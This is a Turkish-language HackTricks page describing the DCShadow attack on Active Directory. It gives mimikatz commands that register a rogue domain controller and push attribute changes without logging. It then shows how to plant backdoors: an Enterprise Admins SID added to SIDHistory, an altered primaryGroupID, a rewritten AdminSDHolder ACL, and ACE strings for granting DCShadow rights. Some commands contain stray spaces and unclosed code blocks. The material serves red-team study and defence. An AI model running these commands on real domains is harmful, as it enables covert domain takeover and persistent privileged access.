<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


# DCShadow

Bu, AD'de bir **yeni Etki Alanı Denetleyicisi** kaydeder ve belirtilen nesneler üzerinde (SIDHistory, SPN'ler...) **özellikleri itmek** için kullanırken herhangi bir **değişiklik** hakkında **günlük** bırakmadan kullanır. **DA** ayrıcalıklarına ve **kök etki alanı** içinde olmanız gerekmektedir.\
Yanlış veri kullanırsanız, oldukça kötü günlükler ortaya çıkacaktır.

Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız vardır. Bunlardan biri, SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacak (burada yapmak istediğiniz değişiklikleri belirtmelisiniz) ve diğer örnek değerleri itmek için kullanılacaktır:

{% code title="mimikatz1 (RPC sunucuları)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - DA veya benzeri yetkiye ihtiyaç duyar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`**'un `mimikatz1` oturumunda çalışmayacağını unutmayın, çünkü bu işlem yalnızca iş parçacığının ayrıcalıklarını yükseltir, ancak **işlemin ayrıcalığını** yükseltmemiz gerekmektedir.\
Ayrıca "LDAP" nesnesini seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Bu değişiklikleri DA (Domain Admin) veya bu en düşük izinlere sahip bir kullanıcıdan yapabilirsiniz:

* **Domain nesnesi** içinde:
* _DS-Install-Replica_ (Alan İçinde Kopya Ekle/Kaldır)
* _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönet)
* _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
* **Yapılandırma konteynırı** içindeki **Sites nesnesi** (ve alt nesneleri):
* _CreateChild ve DeleteChild_
* **DC olarak kaydedilmiş olan bilgisayarın nesnesi**:
* _WriteProperty_ (Yazma değil)
* **Hedef nesne**:
* _WriteProperty_ (Yazma değil)

Bu ayrıcalıkları ayrıcalıksız bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) komutunu kullanabilirsiniz (bu işlem bazı loglar bırakacaktır). Bu, DA (Domain Admin) ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**student1**_ kullanıcı adına sahip olan _**mcorp-student1**_ makinesinde oturum açıldığında _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.

## DCShadow kullanarak arka kapılar oluşturma

{% code title="SIDHistory'de bir kullanıcıya Enterprise Admins atama" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="PrimaryGroupID'yi Değiştirin (kullanıcıyı Domain Yöneticileri üyesi yapın)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="AdminSDHolder'ın ntSecurityDescriptor'ını değiştirin (bir kullanıcıya Tam Denetim verin)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow kullanarak DCShadow izinleri verme (değiştirilmiş izin günlükleri olmadan)

Aşağıdaki ACE'leri kullanıcının SID'siyle birlikte eklememiz gerekiyor:

* Etki alanı nesnesi üzerinde:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Saldırgan bilgisayar nesnesi üzerinde: `(A;;WP;;;UserSID)`
* Hedef kullanıcı nesnesi üzerinde: `(A;;WP;;;UserSID)`
* Yapılandırma konteynerindeki Siteler nesnesi üzerinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Dikkat edin, bu durumda sadece bir tane değil, **birkaç değişiklik yapmanız gerekiyor.** Bu nedenle, **mimikatz1 oturumu** (RPC sunucusu) içinde her değişiklik için **`/stack` parametresini kullanın.** Bu şekilde, tüm takılan değişiklikleri tek bir **`/push`** işlemiyle gerçekleştirmek için yeterli olacaktır.

[**DCShadow hakkında daha fazla bilgi için ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın.**

</details>
